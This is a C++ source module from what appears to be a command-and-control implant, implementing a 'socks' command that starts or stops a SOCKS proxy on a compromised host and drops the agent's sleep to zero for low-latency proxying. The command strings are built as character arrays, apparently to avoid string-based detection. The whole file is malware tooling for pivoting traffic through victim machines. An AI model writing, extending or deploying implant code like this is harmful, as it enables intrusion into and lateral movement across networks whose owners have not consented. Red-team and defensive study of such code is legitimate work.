#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <socks.h>

#ifdef INCLUDE_CMD_SOCKS

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_socks(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action = parser_string( params, &action_len );

    if ( !action || action_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing action" ) ) );
        return;
    }

    char start_str[] = { 's', 't', 'a', 'r', 't', 0 };
    char stop_str[]  = { 's', 't', 'o', 'p', 0 };

    if ( str_ncmp( action, start_str, 5 ) == 0 ) {
        if ( inst.socks_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "socks already active" ) ) );
            return;
        }

        if ( !socks_init( inst ) ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "socks init failed" ) ) );
            return;
        }

        // reduce sleep for low-latency proxying
        inst.agent.sleep_ms = 0;

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "socks started" ) ) );
    } else if ( str_ncmp( action, stop_str, 4 ) == 0 ) {
        if ( !inst.socks_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "socks not active" ) ) );
            return;
        }

        socks_destroy( inst );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "socks stopped" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "unknown action: use start or stop" ) ) );
    }
}

#endif
